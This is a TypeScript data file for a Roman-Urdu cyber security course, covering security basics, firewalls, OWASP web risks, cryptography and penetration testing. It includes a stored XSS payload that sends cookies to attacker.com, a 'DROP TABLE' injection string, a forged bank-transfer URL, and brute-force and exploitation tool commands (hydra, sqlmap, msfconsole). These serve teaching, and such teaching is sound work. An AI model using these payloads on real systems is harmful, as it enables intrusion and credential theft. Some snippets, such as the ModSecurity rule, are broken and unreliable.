import { Course } from "@/types";

export const cyberSecurityCourse: Course = {
  id: "cybersecurity",
  title: "Cyber Security",
  description: "Cyber Security fundamentals seekhein. Network security, web security, cryptography, ethical hacking, penetration testing ke saath.",
  longDescription: "Cyber Security ke fundamentals seekhein. Ethical hacking, network security, cryptography, aur security best practices Roman English mein.",
  lessonsCount: 15,
  duration: "6 hours",
  category: "security",
  difficulty: "intermediate",
  icon: "shield",
  color: "red",
  modules: [
    {
      id: "cybersec-basics",
      title: "Cyber Security Basics aur Advanced Topics",
      description: "Cyber Security ka complete guide.",
      order: 1,
      lessons: [
        {
          id: "cybersec-intro",
          title: "Cyber Security Introduction",
          description: "Cyber Security fundamentals aur CIA triad seekhenge.",
          order: 1,
          content: {
            introduction: "Cyber Security computers, networks, data ko attacks se bachata hai. Is lesson mein CIA triad, security domains, attack types, security controls seekhenge.",
            sections: [
              {
                title: "CIA Triad aur Security Fundamentals",
                explanation: "CIA Triad: Confidentiality (data sirf authorized access), Integrity (data accurate/consistent), Availability (data accessible when needed). AAA: Authentication, Authorization, Accounting. Security controls: Preventive, Detective, Corrective. Risk management: Asset, Threat, Vulnerability, Risk.",
                example: "# CIA Triad Examples\n# Confidentiality: Encryption, Access Control\n# Integrity: Hashing, Digital Signatures\n# Availability: Redundancy, Backups, DDoS protection\n\n# Security Controls\n# Preventive: Firewall, Antivirus, Policies\n# Detective: IDS, Log Monitoring, SIEM\n# Corrective: Incident Response, Patching\n\n# Risk Formula\n# Risk = Threat * Vulnerability * Impact"
              },
              {
                title: "Types of Cyber Attacks",
                explanation: "Malware: Virus, Worm, Trojan, Ransomware, Spyware. Social Engineering: Phishing, Spear-phishing, Pretexting, Baiting. MITM (Man-in-the-Middle): Session hijacking, Eavesdropping. DoS/DDoS: SYN flood, HTTP flood. Password attacks: Brute force, Dictionary, Rainbow tables. SQL Injection, XSS, CSRF.",
                example: "# Attack Types\n# Phishing - fake emails pretending legitimate\n# Ransomware - encrypts files, demands payment\n# DDoS - overwhelms server with traffic\n# MITM - intercepts communication between two parties\n\n# Phishing indicators:\n# - Suspicious sender address\n# - Urgent/ threatening language\n# - Misspellings and bad grammar\n# - Requests for personal info\n# - Suspicious attachments/links"
              },
              {
                title: "Security Domains",
                explanation: "NIST Cybersecurity Framework: Identify, Protect, Detect, Respond, Recover. Domains: Network Security, Application Security, Information Security, Cloud Security, IoT Security, Operational Security, Disaster Recovery, Forensics. Compliance: GDPR, HIPAA, PCI-DSS, ISO 27001. Defense in Depth - multiple security layers.",
                example: "# Defense in Depth Layers\n# 1. Policies & Procedures\n# 2. Physical Security\n# 3. Network Security (Firewall, IDS/IPS)\n# 4. Application Security (Secure code, WAF)\n# 5. OS Security (Hardening, Patching)\n# 6. Data Security (Encryption, DLP)\n# 7. User Awareness Training\n\n# NIST Framework\n# Identify -> Protect -> Detect -> Respond -> Recover"
              }
            ],
            codeExamples: [
              {
                title: "Simple Caesar Cipher",
                language: "python",
                code: "# Caesar Cipher - basic encryption\ndef encrypt(text, shift):\n    result = ''\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\ndef decrypt(text, shift):\n    return encrypt(text, -shift)\n\nmessage = 'Hello World'\nencrypted = encrypt(message, 3)\ndecrypted = decrypt(encrypted, 3)\nprint(f'Original: {message}')\nprint(f'Encrypted: {encrypted}')\nprint(f'Decrypted: {decrypted}')\n\n# Output:\n# Original: Hello World\n# Encrypted: Khoor Zruog\n# Decrypted: Hello World"
              }
            ],
            notes: [
              "CIA triad security ka foundation hai.",
              "Defense in Depth - koi ek security measure sufficient nahi.",
              "Phishing sabse common attack vector hai.",
              "Zero-day vulnerability - vendor ko bhi pata nahi.",
              "Security is a process, not a product."
            ],
            commonMistakes: [
              { mistake: "Same password har jagah use karna", correction: "Password manager use karein, unique passwords har account ke liye." },
              { mistake: "Security controls sirf technical samajhna", correction: "People, Process, Technology - teeno zaroori hain." }
            ],
            interviewQuestions: [
              "CIA triad explain karo?",
              "Phishing se kaise bachein?"
            ],
            practiceExercises: [
              { question: "Password strength checker banao (length, uppercase, lowercase, digits, special chars).", hint: "Regex pattern matching, score calculation.", difficulty: "medium" }
            ],
            quiz: {
              id: "quiz-cybersec-intro",
              title: "Cyber Security Introduction Quiz",
              questions: [
                { id: "q1", question: "CIA triad ke letters?", options: ["Confidentiality, Integrity, Availability", "Control, Identity, Access", "Coding, Integration, Analysis", "None"], correctAnswer: 0, explanation: "CIA triad Confidentiality (gopniyata), Integrity (akshandata), aur Availability (upalabdhata) ko represent karta hai." },
                { id: "q2", question: "DDoS attack target?", options: ["Confidentiality", "Integrity", "Availability", "All"], correctAnswer: 2, explanation: "DDoS (Distributed Denial of Service) availability ko target karta hai, server ko overload karke legitimate users ke liye inaccessible banata hai." },
                { id: "q3", question: "Ransomware type?", options: ["Trojan", "Virus", "Worm", "All of above"], correctAnswer: 3, explanation: "Ransomware Trojan, Virus, ya Worm ke roop mein phail sakta hai - ye files encrypt karke ransom demand karta hai." }
              ]
            }
          },
          duration: "20 min"
        },
        {
          id: "cybersec-network",
          title: "Network Security",
          description: "Network security, firewalls, aur secure protocols seekhenge.",
          order: 2,
          content: {
            introduction: "Network security fundamentals: firewalls, IDS/IPS, VPN, network segmentation, secure protocols, network monitoring seekhenge.",
            sections: [
              {
                title: "Firewalls aur Network Segmentation",
                explanation: "Firewall traffic filter karta hai based on rules. Types: Packet filter (OSI Layer 3/4), Stateful (tracks connections), Application (Layer 7), Next-Gen (NGFW - IPS, anti-malware). ACL (Access Control Lists). DMZ (Demilitarized Zone) - public-facing servers. VLANs network segment karte hain.",
                example: "# Firewall Rules (example)\n# Allow HTTP/HTTPS traffic to web server\npermit tcp any host 10.0.1.10 eq 80\npermit tcp any host 10.0.1.10 eq 443\n\n# Allow SSH from admin network only\npermit tcp 10.0.10.0/24 host 10.0.1.10 eq 22\n\n# Deny all other traffic\ndeny ip any any\n\n# Network Segmentation\n# - Public DMZ: Web servers, DNS, Mail\n# - Internal: Employee workstations, Printers\n# - Management: Admin interfaces\n# - Guest: Separate WiFi, internet only\n\n# iptables Linux firewall\niptables -A INPUT -p tcp --dport 22 -s 10.0.10.0/24 -j ACCEPT\niptables -A INPUT -p tcp --dport 80 -j ACCEPT\niptables -A INPUT -j DROP"
              },
              {
                title: "IDS/IPS aur Network Monitoring",
                explanation: "IDS (Intrusion Detection System) - alerts on suspicious activity. IPS (Intrusion Prevention System) - blocks threats automatically. Signature-based vs Anomaly-based detection. Snort, Suricata popular tools. SIEM (Security Information and Event Management): Splunk, ELK Stack. Network monitoring: Wireshark, tcpdump, NetFlow.",
                example: "# Snort IDS rule example\n# Detect SQL injection attempts\nalert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS\n(\n  msg:'SQL Injection Attempt';\n  content:'union';\n  content:'select';\n  content:'from';\n  within:100;\n  sid:1000001;\n  rev:1;\n)\n\n# tcpdump packet capture\n# Capture HTTP traffic\ntcpdump -i eth0 -n port 80\n\n# Capture and save to file\ntcpdump -i eth0 -w capture.pcap -c 1000\n\n# Wireshark filters\n# http.request - show HTTP requests\n# ip.src == 192.168.1.100 - filter by IP\n# tcp.port == 443 - filter by port"
              },
              {
                title: "VPN aur Secure Protocols",
                explanation: "VPN (Virtual Private Network) - encrypted tunnel between networks. Types: Site-to-Site (IPSec), Remote Access (SSL/TLS), OpenVPN, WireGuard. Protocols: TLS/SSL (HTTPS), SSH, SFTP, IPSec. HTTPS ensures encrypted web traffic. SSH secure remote access. SFTP secure file transfer.",
                example: "# OpenVPN Configuration\n# Server config\nport 1194\nproto udp\ndev tun\nca ca.crt\ncert server.crt\nkey server.key\ndh dh.pem\nserver 10.8.0.0 255.255.255.0\npush 'redirect-gateway def1'\n\n# Client config\nclient\ndev tun\nproto udp\nremote vpnserver.com 1194\nca ca.crt\ncert client.crt\nkey client.key\n\n# SSH security\n# Disable root login\nPermitRootLogin no\n# Use key auth only\nPasswordAuthentication no\n# Change default port (22)\nPort 2222\n# Allow specific users\nAllowUsers rahul admin"
              }
            ],
            codeExamples: [
              {
                title: "Port Scanner",
                language: "python",
                code: "import socket\n\ndef scan_ports(host, start_port, end_port):\n    open_ports = []\n    for port in range(start_port, end_port + 1):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        if result == 0:\n            open_ports.append(port)\n        sock.close()\n    return open_ports\n\nhost = 'scanme.nmap.org'\nprint(f'Scanning {host}...')\nopen_ports = scan_ports(host, 20, 1000)\nprint(f'Open ports: {open_ports}')\n\n# Common port mappings\n# 21: FTP, 22: SSH, 23: Telnet\n# 25: SMTP, 53: DNS, 80: HTTP\n# 443: HTTPS, 3306: MySQL, 3389: RDP"
              }
            ],
            notes: [
              "Firewall first line of defense hai.",
              "DMZ public servers ko internal network se alag rakhta hai.",
              "IDS alerts, IPS blocks - difference important hai.",
              "SIEM security events centralize karta hai.",
              "VPN public network par private connection create karta hai."
            ],
            commonMistakes: [
              { mistake: "Default firewall rules allow all", correction: "Default deny policy, allow only necessary traffic." },
              { mistake: "Unnecessary open ports", correction: "Regular port scans karo, unused ports close karo." }
            ],
            interviewQuestions: [
              "IDS vs IPS difference?",
              "Stateful vs Stateless firewall?"
            ],
            practiceExercises: [
              { question: "Simple firewall rule set design karo for a web server (allow 80, 443, SSH from admin).", hint: "Default deny, specific allow rules.", difficulty: "medium" }
            ],
            quiz: {
              id: "quiz-cybersec-network",
              title: "Network Security Quiz",
              questions: [
                { id: "q1", question: "DMZ purpose?", options: ["Public servers host", "Internal network", "Backup", "Admin access"], correctAnswer: 0, explanation: "DMZ (Demilitarized Zone) public-facing servers (web, mail, DNS) ko internal network se alag rakhne ke liye use hota hai." },
                { id: "q2", question: "VPN encryption protocol?", options: ["HTTP", "TLS/IPSec", "FTP", "SMTP"], correctAnswer: 1, explanation: "VPN secure communication ke liye TLS ya IPSec encryption protocols use karta hai, jo data ko encrypt karke bhejta hai." },
                { id: "q3", question: "SIEM full form?", options: ["Security Information and Event Management", "System Integration and Event Monitor", "Security Incident and Error Management", "None"], correctAnswer: 0, explanation: "SIEM (Security Information and Event Management) security events ko centralize karta hai, analyze karta hai, aur alerts generate karta hai." }
              ]
            }
          },
          duration: "25 min"
        },
        {
          id: "cybersec-web",
          title: "Web Security",
          description: "Web application security aur OWASP Top 10 vulnerabilities seekhenge.",
          order: 3,
          content: {
            introduction: "Web application security: OWASP Top 10, SQL Injection, XSS, CSRF, authentication flaws, secure coding practices seekhenge.",
            sections: [
              {
                title: "OWASP Top 10 & SQL Injection",
                explanation: "OWASP Top 10 web app risks: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Auth Failures, Data Integrity Failures, Logging Failures, SSRF. SQL Injection: attacker SQL queries inject karta hai. Impact: data theft, deletion, auth bypass.",
                example: "# Vulnerable code (SQL Injection)\nuser_input = \"1; DROP TABLE users;--\"\nquery = f\"SELECT * FROM users WHERE id = {user_input}\"\n\n# Secure code (Parameterized Query)\nimport sqlite3\nconn = sqlite3.connect('db.sqlite')\ncursor = conn.cursor()\n\n# Parameterized query\nuser_input = 1\ncursor.execute('SELECT * FROM users WHERE id = ?', (user_input,))\n\n# ORM approach (SQLAlchemy)\nuser = session.query(User).filter(User.id == user_input).first()\n\n# Input validation\nif not user_input.isdigit():\n    raise ValueError('Invalid input')\n\n# WAF (Web Application Firewall) block\n# ModSecurity rule\nglobal protect SQL Injection\nSecRule ARGS '@detectSQLi' 'id:1000,deny,status:403'"
              },
              {
                title: "XSS aur CSRF",
                explanation: "XSS (Cross-Site Scripting): attacker browser mein malicious script inject karta hai. Types: Stored (persistent), Reflected (URL-based), DOM-based. Impact: cookie theft, session hijacking, defacement. CSRF (Cross-Site Request Forgery): user unaware mein actions perform karta hai. Prevention: CSRF tokens, SameSite cookies.",
                example: "# Stored XSS example\n# Comment box mein script stored\ncomment = '<script>document.location=\"http://attacker.com/steal?cookie=\"+document.cookie</script>'\n\n# XSS Prevention\n# Output encoding (context-aware)\nimport html\nsafe_comment = html.escape(user_comment)  # &lt;script&gt;...\n\n# Content Security Policy (CSP) header\n# script-src 'self' - only same-origin scripts\n# object-src 'none' - no plugins\n\n# CSRF Attack\n# If user logged in visits attacker site\nget https://bank.com/transfer?amount=1000&to=attacker\n\n# CSRF Prevention\n# CSRF Token\n<form>\n  <input type='hidden' name='csrf_token' value='random123'>\n</form>\n\n# SameSite Cookie (Lax/Strict)\nset-cookie: sessionid=abc; SameSite=Lax\n\n# Double Submit Cookie pattern"
              },
              {
                title: "Authentication & Authorization",
                explanation: "Authentication (who you are) vs Authorization (what you can do). Common flaws: weak passwords, no rate limiting, insecure session management, JWT vulnerabilities. Best practices: bcrypt/argon2 hashing, MFA, session timeout, OAuth 2.0, JWT with short expiry. Session fixation, session hijacking prevention.",
                example: "# Secure password hashing (bcrypt)\nimport bcrypt\n\n# Hash password\npassword = b'my_secure_password'\nsalt = bcrypt.gensalt()\nhashed = bcrypt.hashpw(password, salt)\n\n# Verify password\nif bcrypt.checkpw(password, hashed):\n    print('Password correct')\n\n# JWT (JSON Web Token)\nimport jwt\n\n# Create token\npayload = {'user_id': 123, 'role': 'admin'}\ntoken = jwt.encode(payload, 'secret_key', algorithm='HS256')\n\n# Verify token\ntry:\n    decoded = jwt.decode(token, 'secret_key', algorithms=['HS256'])\n    print(f'User: {decoded[\"user_id\"]}')\nexcept jwt.ExpiredSignatureError:\n    print('Token expired')\nexcept jwt.InvalidTokenError:\n    print('Invalid token')\n\n# Rate limiting\n# Flask-Limiter example\nfrom flask_limiter import Limiter\nlimiter = Limiter(app, key_func=lambda: request.remote_addr)\n\n@app.route('/login')\n@limiter.limit('5 per minute')\ndef login():\n    return 'Login page'"
              }
            ],
            codeExamples: [
              {
                title: "Secure Login System",
                language: "python",
                code: "from flask import Flask, request, session\nfrom werkzeug.security import generate_password_hash, check_password_hash\nimport secrets\n\napp = Flask(__name__)\napp.secret_key = secrets.token_hex(32)\n\n# Secure session configuration\napp.config.update(\n    SESSION_COOKIE_SECURE=True,    # HTTPS only\n    SESSION_COOKIE_HTTPONLY=True,  # No JS access\n    SESSION_COOKIE_SAMESITE='Lax', # CSRF protection\n    PERMANENT_SESSION_LIFETIME=1800  # 30 min\n)\n\n@app.route('/register', methods=['POST'])\ndef register():\n    username = request.form['username']\n    password = request.form['password']\n    # Validate input\n    if len(password) < 8:\n        return 'Password too short', 400\n    # Hash password\n    hashed = generate_password_hash(password, method='pbkdf2:sha256:600000')\n    # Store in database\n    # db.execute('INSERT INTO users VALUES (?, ?)', username, hashed)\n    return 'Registered successfully'\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    # Get user from DB\n    # user = db.execute('SELECT * FROM users WHERE username=?', username)\n    # if user and check_password_hash(user.password, password):\n    #     session['user_id'] = user.id\n    #     return 'Logged in'\n    return 'Invalid credentials', 401"
              }
            ],
            notes: [
              "OWASP Top 10 web apps ke main risks hain.",
              "Parameterized queries SQL Injection se bachate hain.",
              "XSS output encoding se prevent hota hai.",
              "CSRF tokens state-changing requests protect karte hain.",
              "bcrypt/argon2 password hashing ke liye best practices hain."
            ],
            commonMistakes: [
              { mistake: "SQL queries string concatenation se banana", correction: "Hamesha parameterized queries ya ORM use karein." },
              { mistake: "Password plain text store karna", correction: "bcrypt ya argon2 hash use karein, never plain text." }
            ],
            interviewQuestions: [
              "SQL Injection prevention?",
              "CSP header kya karta hai?"
            ],
            practiceExercises: [
              { question: "Input sanitization function banao jo HTML tags strip kare.", hint: "HTML escaping, regex, or bleach library use karo.", difficulty: "medium" }
            ],
            quiz: {
              id: "quiz-cybersec-web",
              title: "Web Security Quiz",
              questions: [
                { id: "q1", question: "SQL Injection prevention?", options: ["String concat", "Parameterized query", "Client-side JS", "Base64 encode"], correctAnswer: 1, explanation: "Parameterized queries (prepared statements) SQL Injection se bachate hain kyunki user input ko SQL query se alag treat kiya jata hai." },
                { id: "q2", question: "XSS prevention?", options: ["Output encoding", "Input encoding", "HTML tags allow", "None"], correctAnswer: 0, explanation: "Output encoding (HTML entity encoding) XSS attacks ko prevent karta hai kyunki browser script tags ko execute nahi karta." },
                { id: "q3", question: "CSRF token purpose?", options: ["Auth", "Request forgery prevent", "Encryption", "Caching"], correctAnswer: 1, explanation: "CSRF token har request mein unique token bhejta hai taake attacker forged request se user ki taraf se action na kar sake." }
              ]
            }
          },
          duration: "25 min"
        },
        {
          id: "cybersec-cryptography",
          title: "Cryptography",
          description: "Encryption, hashing aur cryptography concepts seekhenge.",
          order: 4,
          content: {
            introduction: "Cryptography concepts: symmetric/asymmetric encryption, hashing, digital signatures, PKI, SSL/TLS, encryption algorithms seekhenge.",
            sections: [
              {
                title: "Symmetric vs Asymmetric Encryption",
                explanation: "Symmetric: same key for encrypt/decrypt. AES (Advanced Encryption Standard), DES, ChaCha20. Fast but key distribution problem. Asymmetric: public/private key pair. RSA, ECC (Elliptic Curve), Diffie-Hellman. Slow but solves key exchange. Hybrid: TLS uses asymmetric for key exchange, symmetric for data.",
                example: "# Symmetric Encryption (AES)\nfrom Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nimport base64\n\nkey = get_random_bytes(16)  # AES-128\ncipher = AES.new(key, AES.MODE_GCM)\nplaintext = b'Secret message'\nciphertext, tag = cipher.encrypt_and_digest(plaintext)\nnonce = cipher.nonce\n\n# Decrypt\ncipher_dec = AES.new(key, AES.MODE_GCM, nonce=nonce)\ndecrypted = cipher_dec.decrypt_and_verify(ciphertext, tag)\nprint(f'Decrypted: {decrypted.decode()}')\n\n# Asymmetric Encryption (RSA)\nfrom Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\n\nkey = RSA.generate(2048)\nprivate_key = key\npublic_key = key.publickey()\n\ncipher_rsa = PKCS1_OAEP.new(public_key)\nciphertext = cipher_rsa.encrypt(b'Secret')\n\ncipher_rsa_dec = PKCS1_OAEP.new(private_key)\nplaintext = cipher_rsa_dec.decrypt(ciphertext)"
              },
              {
                title: "Hashing aur Digital Signatures",
                explanation: "Hashing one-way function. SHA-256, SHA-3, MD5 (broken). Properties: deterministic, fast, preimage resistance, collision resistance. Uses: password storage, data integrity, digital signatures. HMAC (Hash-based MAC) - with secret key. Digital signature: sign with private key, verify with public. Non-repudiation.",
                example: "import hashlib\nimport hmac\n\n# SHA-256 Hashing\nmessage = 'Hello World'\nhash_obj = hashlib.sha256(message.encode())\nhex_dig = hash_obj.hexdigest()\nprint(f'SHA-256: {hex_dig}')\nprint(f'Length: {len(hex_dig)} chars')  # 64 chars\n\n# File integrity check\ndef file_hash(filename):\n    h = hashlib.sha256()\n    with open(filename, 'rb') as f:\n        for chunk in iter(lambda: f.read(4096), b''):\n            h.update(chunk)\n    return h.hexdigest()\n\n# HMAC (with secret key)\nsecret_key = b'super-secret-key'\nmessage = b'Important message'\nhmac_obj = hmac.new(secret_key, message, hashlib.sha256)\nprint(f'HMAC: {hmac_obj.hexdigest()}')\n\n# Digital Signature\nfrom Crypto.Signature import pkcs1_15\nfrom Crypto.Hash import SHA256\n\nkey = RSA.generate(2048)\nh = SHA256.new(message.encode())\nsignature = pkcs1_15.new(key).sign(h)\ntry:\n    pkcs1_15.new(key.publickey()).verify(h, signature)\n    print('Signature valid')\nexcept (ValueError, TypeError):\n    print('Signature invalid')"
              },
              {
                title: "PKI, SSL/TLS & Certificates",
                explanation: "PKI (Public Key Infrastructure): CA (Certificate Authority), certificates, public/private keys. SSL/TLS: handshake protocol for secure communication. Certificate chain: Root CA -> Intermediate CA -> Server cert. X.509 certificate format. Certificate validation: expiry, revocation (CRL, OCSP), domain match. HTTPS = HTTP + TLS.",
                example: "# SSL/TLS Handshake (simplified)\n# 1. Client Hello - supported ciphers, TLS version\n# 2. Server Hello - chosen cipher, certificate\n# 3. Certificate verification - CA check\n# 4. Key Exchange - Diffie-Hellman (PFS)\n# 5. Session keys generated\n# 6. Encrypted communication starts\n\n# Generate self-signed certificate\n# openssl req -x509 -newkey rsa:4096 \\\n#   -keyout key.pem -out cert.pem \\\n#   -days 365 -nodes\n\n# View certificate info\n# openssl x509 -in cert.pem -text -noout\n\n# Check SSL/TLS of a website\n# openssl s_client -connect example.com:443\n\n# Python TLS client\nimport ssl\nimport socket\n\ncontext = ssl.create_default_context()\nwith socket.create_connection(('example.com', 443)) as sock:\n    with context.wrap_socket(sock, server_hostname='example.com') as ssock:\n        print(f'TLS version: {ssock.version()}')\n        print(f'Cipher: {ssock.cipher()}')\n        cert = ssock.getpeercert()\n        print(f'Issuer: {cert[\"issuer\"]}')"
              }
            ],
            codeExamples: [
              {
                title: "Encrypt/Decrypt File",
                language: "python",
                code: "from Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nimport os\n\ndef encrypt_file(filename, key):\n    cipher = AES.new(key, AES.MODE_GCM)\n    with open(filename, 'rb') as f:\n        plaintext = f.read()\n    ciphertext, tag = cipher.encrypt_and_digest(plaintext)\n    with open(filename + '.enc', 'wb') as f:\n        f.write(cipher.nonce)\n        f.write(tag)\n        f.write(ciphertext)\n    print(f'Encrypted: {filename}.enc')\n\ndef decrypt_file(filename, key):\n    with open(filename, 'rb') as f:\n        nonce = f.read(16)\n        tag = f.read(16)\n        ciphertext = f.read()\n    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)\n    plaintext = cipher.decrypt_and_verify(ciphertext, tag)\n    with open(filename[:-4], 'wb') as f:\n        f.write(plaintext)\n    print(f'Decrypted: {filename[:-4]}')\n\nkey = os.urandom(32)  # AES-256\nencrypt_file('secret.txt', key)\ndecrypt_file('secret.txt.enc', key)"
              }
            ],
            notes: [
              "AES most widely used symmetric encryption.",
              "RSA slow hai, usually key exchange ke liye use hota hai.",
              "SHA-256 collision-resistant and secure hai.",
              "TLS internet security ka foundation hai.",
              "Perfect Forward Secrecy (PFS) ensures past session keys compromised nahi hote."
            ],
            commonMistakes: [
              { mistake: "MD5/SHA-1 hashing use karna", correction: "SHA-256 ya SHA-3 use karein, MD5/SHA-1 broken hain." },
              { mistake: "Self-signed cert production mein use karna", correction: "CA-issued certificate use karein (Let's Encrypt free hai)." }
            ],
            interviewQuestions: [
              "Symmetric vs Asymmetric encryption?",
              "TLS handshake steps?"
            ],
            practiceExercises: [
              { question: "File hashing tool banao (SHA-256) that verifies integrity.", hint: "hashlib.sha256(), file reading in chunks.", difficulty: "medium" }
            ],
            quiz: {
              id: "quiz-cybersec-cryptography",
              title: "Cryptography Quiz",
              questions: [
                { id: "q1", question: "AES encryption type?", options: ["Symmetric", "Asymmetric", "Hash", "Hybrid"], correctAnswer: 0, explanation: "AES (Advanced Encryption Standard) symmetric encryption hai - encryption aur decryption ke liye same key use hoti hai." },
                { id: "q2", question: "TLS uses which hybrid approach?", options: ["Asymmetric for key, Symmetric for data", "Symmetric only", "Asymmetric only", "None"], correctAnswer: 0, explanation: "TLS asymmetric encryption use karta hai secure key exchange ke liye aur symmetric encryption actual data encrypt karne ke liye." },
                { id: "q3", question: "Digital signature provides?", options: ["Confidentiality", "Non-repudiation", "Availability", "Speed"], correctAnswer: 1, explanation: "Digital signature non-repudiation provide karta hai - sender baad mein ye nahi keh sakta ki usne message nahi bheja." }
              ]
            }
          },
          duration: "25 min"
        },
        {
          id: "cybersec-ethical-hacking",
          title: "Ethical Hacking aur Penetration Testing",
          description: "Ethical hacking methodology aur penetration testing seekhenge.",
          order: 5,
          content: {
            introduction: "Ethical hacking, penetration testing methodology, Kali Linux tools, vulnerability assessment, bug bounty programs seekhenge.",
            sections: [
              {
                title: "Penetration Testing Methodology",
                explanation: "Phases: Reconnaissance (information gathering), Scanning (ports, services), Exploitation (gain access), Post-exploitation (privilege escalation), Reporting (findings document). Black box (no info), White box (full info), Grey box (partial info). Rules of Engagement (ROE) legal boundary. Responsible disclosure.",
                example: "# Penetration Testing Phases\n\n# 1. Reconnaissance\n# Passive: Google dorking, WHOIS, Shodan, Social media\n# Active: DNS enumeration (nslookup), Subdomain find\n\n# 2. Scanning\nnmap -sV -sC -O target.com  # version, scripts, OS\ngobuster dir -u https://target.com -w wordlist.txt  # directory busting\nnikto -h https://target.com  # web vulnerabilities\n\n# 3. Exploitation\n# Metasploit framework\nmsfconsole\nuse exploit/multi/handler\n\n# 4. Post-exploitation\nwhoami  # current user\nuname -a  # system info\nsudo -l  # sudo privileges\n\n# 5. Reporting\n# Executive summary (non-technical)\n# Technical details (screenshots, PoC)\n# Remediation recommendations"
              },
              {
                title: "Kali Linux Tools",
                explanation: "Nmap: port scanning, OS detection, service enumeration. Metasploit: exploit development, payload generation. Burp Suite: web proxy, intercept, scanner, repeater. Wireshark: packet analysis. John the Ripper/Hashcat: password cracking. Aircrack-ng: WiFi auditing. SQLmap: SQL injection automation. Hydra: brute force authentication.",
                example: "# Nmap\nnmap -p- -A 192.168.1.1  # all ports, aggressive\nnmap --script vuln target.com  # vulnerability scan\n\n# SQLmap\nsqlmap -u 'http://target.com/page?id=1' --dbs  # enumerate databases\n\n# Hydra\nhydra -l admin -P passwords.txt ssh://192.168.1.100\n\n# John the Ripper\njohn --wordlist=rockyou.txt hash.txt\n\n# Metasploit\nmsfconsole\n  use auxiliary/scanner/ssh/ssh_version\n  set RHOSTS 192.168.1.0/24\n  run\n\n# Burp Suite\n# 1. Proxy - intercept HTTP/HTTPS\n# 2. Repeater - modify and resend\n# 3. Intruder - automated parameter fuzzing\n# 4. Scanner - automated vulnerability detection"
              },
              {
                title: "Bug Bounty & Responsible Disclosure",
                explanation: "Bug bounty programs: HackerOne, Bugcrowd, Synack. Companies pay for vulnerabilities. VDP (Vulnerability Disclosure Program) - no payment but recognition. CVE (Common Vulnerabilities and Exposures) system. CVSS (Common Vulnerability Scoring System) severity scoring. Responsible disclosure process: report -> verify -> fix -> public disclosure. Scope: in-scope (allowed), out-of-scope (not allowed).",
                example: "# Vulnerability Scoring (CVSS v3)\n# Base Score Metrics:\n# AV:N (Network) - attack vector\n# AC:L (Low) - attack complexity\n# PR:N (None) - privileges required\n# UI:N (None) - user interaction\n# S:U (Unchanged) - scope\n# C:H (High) - confidentiality impact\n# I:H (High) - integrity impact\n# A:H (High) - availability impact\n# Score: 9.8 (Critical)\n\n# Bug Bounty Report Template\n# Title: [Vulnerability Type] in [Component]\n# Severity: Critical / High / Medium / Low\n# Description:\n#   - What is the vulnerability\n#   - Where it exists (URL, endpoint)\n# Steps to Reproduce:\n#   1. Navigate to...\n#   2. Send request...\n#   3. Observe...\n# Impact:\n#   - What attacker can achieve\n# Proof of Concept:\n#   - Screenshots / Video\n#   - Request/Response\n# Remediation:\n#   - How to fix"
              }
            ],
            codeExamples: [
              {
                title: "Simple Port Scanner + Service Detection",
                language: "python",
                code: "import socket\nimport sys\n\ndef scan_port(host, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)\n        result = sock.connect_ex((host, port))\n        if result == 0:\n            try:\n                service = socket.getservbyport(port)\n            except:\n                service = 'unknown'\n            sock.close()\n            return True, service\n        sock.close()\n        return False, None\n    except Exception as e:\n        return False, None\n\ndef banner_grabbing(host, port):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(2)\n        sock.connect((host, port))\n        sock.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')\n        banner = sock.recv(1024).decode().strip()\n        sock.close()\n        return banner[:100] if banner else 'No banner'\n    except:\n        return 'Could not grab banner'\n\nhost = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'\ncommon_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]\n\nprint(f'Scanning {host}...')\nfor port in common_ports:\n    is_open, service = scan_port(host, port)\n    if is_open:\n        banner = banner_grabbing(host, port)\n        print(f'Port {port} ({service}): OPEN - {banner}')"
              }
            ],
            notes: [
              "Ethical hacking always with written permission.",
              "Kali Linux penetration testing ke liye specialized OS.",
              "Nmap host discovery aur enumeration ka standard tool.",
              "Bug bounty real-world experience pays money.",
              "Responsible disclosure - don't exploit beyond proof of concept."
            ],
            commonMistakes: [
              { mistake: "Bina permission ke testing karna", correction: "Hamesha written authorization lo. Bug bounty scope follow karo." },
              { mistake: "Found vulnerability ka public disclosure bina vendor ko bataye", correction: "Responsible disclosure follow karo - vendor ko pehle inform." }
            ],
            interviewQuestions: [
              "Black box vs White box testing?",
              "Responsible disclosure process?"
            ],
            practiceExercises: [
              { question: "Vulnerability report likho for a hypothetical XSS finding.", hint: "Title, severity, description, steps, impact, remediation.", difficulty: "medium" }
            ],
            quiz: {
              id: "quiz-cybersec-ethical-hacking",
              title: "Ethical Hacking & Penetration Testing Quiz",
              questions: [
                { id: "q1", question: "Pen testing first phase?", options: ["Exploitation", "Reconnaissance", "Reporting", "Scanning"], correctAnswer: 1, explanation: "Penetration testing ka pehla phase Reconnaissance hai, jahan target ke baare mein information gather ki jati hai." },
                { id: "q2", question: "Kali Linux nmap use?", options: ["Port scanning", "Web proxy", "Password cracking", "Packet analysis"], correctAnswer: 0, explanation: "Nmap Kali Linux ka port scanning tool hai jo open ports, services, aur OS detection ke liye use hota hai." },
                { id: "q3", question: "Bug bounty platform?", options: ["HackerOne", "GitHub", "Docker Hub", "npm"], correctAnswer: 0, explanation: "HackerOne ek popular bug bounty platform hai jahan companies vulnerabilities report karne ke liye payment deti hain." }
              ]
            }
          },
          duration: "30 min"
        }
      ]
    }
